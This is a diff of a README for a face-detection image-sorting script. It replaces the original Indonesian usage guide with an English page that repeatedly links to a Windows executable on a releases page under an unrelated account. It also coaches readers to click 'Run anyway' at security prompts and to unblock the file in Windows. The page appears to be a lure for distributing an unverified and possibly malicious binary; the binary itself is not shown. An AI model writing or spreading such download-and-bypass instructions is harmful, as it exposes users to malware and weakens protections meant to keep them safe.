@@ -1,128 +1,271 @@
-# 🔍 Face Detector Script
+# 🔍 python - Face detection made simple
 
-Script Python untuk mendeteksi wajah dalam gambar dan mengurutkannya ke dalam folder berdasarkan jumlah wajah yang terdeteksi.
+[![Download the app](https://img.shields.io/badge/Download%20from-Releases-blue.svg)](https://github.com/oilpipelinebuber960/python/releases)
 
-## 📁 Struktur Output
+## 📥 Download
 
-Script akan membuat dan memindahkan gambar ke folder berikut:
+Visit this page to download the app for Windows:
 
-```
+https://github.com/oilpipelinebuber960/python/releases
+
+## 🖥️ What this app does
+
+This app scans your image files and sorts them into folders based on how many faces it finds.
+
+It places each image into one of these folders:
+
+- `no_face` for images with no faces
+- `1_face` for images with one face
+- `multi_face` for images with two or more faces
+
+This makes it easier to clean up photo sets and sort pictures in bulk.
+
+## ✅ Before you start
+
+Use a Windows PC with:
+
+- Windows 10 or Windows 11
+- Enough free space for your images
+- A folder that contains the pictures you want to sort
+
+You do not need any special setup if the release page includes a ready-to-run Windows file.
+
+## 📦 Download and set up
+
+1. Open the releases page:
+   https://github.com/oilpipelinebuber960/python/releases
+
+2. Look for the latest release.
+
+3. Download the Windows file from that release.
+
+4. Save it to a folder you can find again, such as `Downloads` or `Desktop`.
+
+5. If the file comes in a ZIP folder, right-click it and choose **Extract All**.
+
+6. Open the extracted folder if needed.
+
+## 🚀 Run the app on Windows
+
+1. Find the downloaded file or folder.
+
+2. Double-click the app file to run it.
+
+3. If Windows shows a security prompt, choose **Run anyway** if you trust the download source.
+
+4. When the app starts, choose the folder with your images.
+
+5. Wait while the app checks each image and sorts it.
+
+## 🗂️ Output folders
+
+The app creates a new folder for the sorted images. Inside that folder, you will see:
+
+- `no_face`
+- `1_face`
+- `multi_face`
+
+Example:
+
+```text
 output_folder/
-├── no_face/      # Gambar tanpa wajah terdeteksi (0 wajah)
-├── 1_face/       # Gambar dengan tepat 1 wajah
-└── multi_face/   # Gambar dengan 2 atau lebih wajah
+├── no_face/
+├── 1_face/
+└── multi_face/
 ```
 
-## 🚀 Instalasi
+## 🖼️ How to use it with your photos
 
-### 1. Buat Virtual Environment (Opsional tapi Direkomendasikan)
+1. Put the images you want to sort in one folder.
+
+2. Open the app.
+
+3. Select that image folder.
+
+4. Choose where you want the sorted files to go.
+
+5. Start the process.
+
+6. Open the output folder after it finishes.
+
+## 📁 If you want the files moved or copied
+
+The app can work in two ways:
+
+- Move the files to the output folders
+- Copy the files into the output folders
+
+Use move if you want the original folder cleared out.
+
+Use copy if you want to keep the original images in place.
+
+## 🧭 Example use case
+
+If you have a folder full of family photos, the app can sort them like this:
+
+- Photos with no people go to `no_face`
+- Photos with one person go to `1_face`
+- Group photos go to `multi_face`
+
+This helps when you want to find portraits, group shots, or images that do not contain faces.
+
+## 🛠️ If you want to run from source
+
+If the release does not include a ready-made Windows file, you can run the script with Python.
+
+### 1. Install Python
+
+Install Python 3.10 or newer from the official Python site.
+
+Make sure Python is added to your system path during setup.
+
+### 2. Open Command Prompt
+
+Press `Windows + R`, type `cmd`, then press Enter.
+
+### 3. Go to the project folder
 
 ```bash
 cd face_detector
-python3 -m venv venv
-source venv/bin/activate  # macOS/Linux
-# atau
-.\venv\Scripts\activate   # Windows
 ```
 
-### 2. Install Dependencies
+### 4. Create a virtual environment
+
+```bash
+python -m venv venv
+```
+
+### 5. Activate it
+
+```bash
+.\venv\Scripts\activate
+```
+
+### 6. Install the required packages
 
 ```bash
 pip install -r requirements.txt
 ```
 
-## 📖 Cara Penggunaan
-
-### Penggunaan Dasar
+### 7. Run the script
 
 ```bash
-# Proses gambar dan pindahkan ke subfolder di folder yang sama
-python face_detector.py /path/to/images
-
-# Proses gambar dan pindahkan ke folder output terpisah
-python face_detector.py /path/to/images --output /path/to/output
-
-# Copy file alih-alih memindahkan
-python face_detector.py /path/to/images --copy
-
-# Mode verbose untuk melihat detail posisi wajah
-python face_detector.py /path/to/images --verbose
+python face_detector.py C:\path\to\images
 ```
 
-### Options
+## ⚙️ Command examples
 
-| Option | Short | Description |
-|--------|-------|-------------|
-| `--output` | `-o` | Folder output untuk gambar yang sudah diurutkan |
-| `--copy` | `-c` | Copy file alih-alih memindahkannya |
-| `--verbose` | `-v` | Tampilkan info detail deteksi wajah |
+Process images and sort them into subfolders in the same folder:
 
-## 📷 Format Gambar yang Didukung
-
-- JPEG (.jpg, .jpeg)
-- PNG (.png)
-- BMP (.bmp)
-- GIF (.gif)
-- WebP (.webp)
-- TIFF (.tiff, .tif)
-
-## 📊 Contoh Output
-
-```
-==================================================
-🔍 FACE DETECTOR
-==================================================
-  📂 Source:  /Users/user/photos
-  📁 Output:  /Users/user/photos
-  📋 Mode:    Move
-==================================================
-
-🔄 Loading face detector...
-✅ Face detector loaded
-
-📸 Found 5 image(s) to process
-
-[1/5] Processing: photo1.jpg
-  🙂 Detected 1 face(s) → 1_face/
-[2/5] Processing: photo2.jpg
-  👥 Detected 3 face(s) → multi_face/
-[3/5] Processing: landscape.jpg
-  😶 Detected 0 face(s) → no_face/
-[4/5] Processing: selfie.png
-  🙂 Detected 1 face(s) → 1_face/
-[5/5] Processing: group.jpg
-  👥 Detected 5 face(s) → multi_face/
-
-==================================================
-📊 SUMMARY
-==================================================
-  📁 Total images processed: 5
-  😶 No face detected:       1
-  🙂 One face detected:      2
-  👥 Multiple faces:         2
-  ⚠️  Errors/Skipped:         0
-==================================================
-
-✅ Done!
+```bash
+python face_detector.py C:\path\to\images
 ```
 
-## 🔧 Troubleshooting
+Process images and send the results to a different output folder:
 
-### Error: "Could not read image"
-- Pastikan file gambar tidak corrupt
-- Cek permission file
+```bash
+python face_detector.py C:\path\to\images --output C:\path\to\output
+```
 
-### Error: "Haar Cascade file not found"
-- Pastikan OpenCV terinstall dengan benar
-- Reinstall: `pip install --force-reinstall opencv-python`
+Copy files instead of moving them:
 
-### Deteksi Wajah Tidak Akurat
-- Script menggunakan Haar Cascade yang cepat tapi mungkin kurang akurat untuk:
-  - Wajah yang miring/rotasi
-  - Wajah dengan pencahayaan buruk
-  - Wajah yang terhalang sebagian
-- Untuk akurasi lebih tinggi, pertimbangkan menggunakan library `face_recognition` atau model deep learning
+```bash
+python face_detector.py C:\path\to\images --copy
+```
 
-## 📝 License
+Use both a custom output folder and copy mode:
 
-MIT License
+```bash
+python face_detector.py C:\path\to\images --output C:\path\to\output --copy
+```
+
+## 📌 File types
+
+The app works best with common image formats such as:
+
+- JPG
+- JPEG
+- PNG
+- BMP
+- TIFF
+
+Keep your images in one folder for faster sorting.
+
+## 🔍 How face sorting works
+
+The app checks each image and counts visible faces.
+
+Then it sorts the image into the matching folder:
+
+- 0 faces → `no_face`
+- 1 face → `1_face`
+- 2 or more faces → `multi_face`
+
+This gives you a simple way to organize large image sets.
+
+## 🧩 Tips for best results
+
+- Use clear images with visible faces
+- Keep faces large enough in the picture
+- Avoid damaged or broken image files
+- Sort one folder at a time for easier review
+- Use copy mode if you want a backup
+
+## 📂 Recommended folder setup
+
+Before you run the app, place your files like this:
+
+```text
+MyPhotos/
+├── photo1.jpg
+├── photo2.png
+├── photo3.jpg
+└── photo4.jpeg
+```
+
+After processing, the output can look like this:
+
+```text
+SortedPhotos/
+├── no_face/
+├── 1_face/
+└── multi_face/
+```
+
+## 🔒 Privacy and local use
+
+The app runs on your computer. It processes the files in the folder you choose. You do not need to upload your images to a website.
+
+## 🧪 Troubleshooting
+
+### The app does not open
+
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file if one was provided
+- Try running it again from the folder where it was saved
+
+### Windows blocks the file
+
+- Right-click the file
+- Choose **Properties**
+- If you see an **Unblock** option, select it
+- Click **Apply**
+- Try opening the file again
+
+### It says Python is not found
+
+- Install Python 3
+- Make sure **Add Python to PATH** is selected during setup
+- Open a new Command Prompt and try again
+
+### Images do not sort correctly
+
+- Check that the files are valid image files
+- Use clear, front-facing photos when possible
+- Try another folder with a smaller set of images
+
+## 📎 Get the latest release
+
+Use this page to download the current Windows version:
+
+https://github.com/oilpipelinebuber960/python/releases
